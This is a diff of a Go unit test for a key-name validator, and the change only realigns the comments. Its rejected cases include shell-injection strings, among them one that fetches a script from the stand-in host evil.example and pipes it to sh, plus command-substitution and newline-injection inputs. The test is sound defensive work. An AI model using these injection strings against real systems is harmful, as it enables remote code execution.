@@ -14,13 +14,13 @@ func TestIsValidKey(t *testing.T) {
 		{"_under", true},
 		{"a1b2", true},
 		{"", false},
-		{"1FOO", false},                           // can't start with digit
-		{"FOO BAR", false},                        // space
-		{"FOO-BAR", false},                        // hyphen
-		{"EVIL;curl evil.example|sh;X", false},    // shell-injection payload
-		{"EVIL$(id)X", false},                     // command substitution
-		{"EVIL\nINJECT=ok", false},                // newline
-		{"EVIL=ok", false},                        // equals
+		{"1FOO", false},                        // can't start with digit
+		{"FOO BAR", false},                     // space
+		{"FOO-BAR", false},                     // hyphen
+		{"EVIL;curl evil.example|sh;X", false}, // shell-injection payload
+		{"EVIL$(id)X", false},                  // command substitution
+		{"EVIL\nINJECT=ok", false},             // newline
+		{"EVIL=ok", false},                     // equals
 	}
 	for _, c := range cases {
 		if got := IsValidKey(c.in); got != c.want {
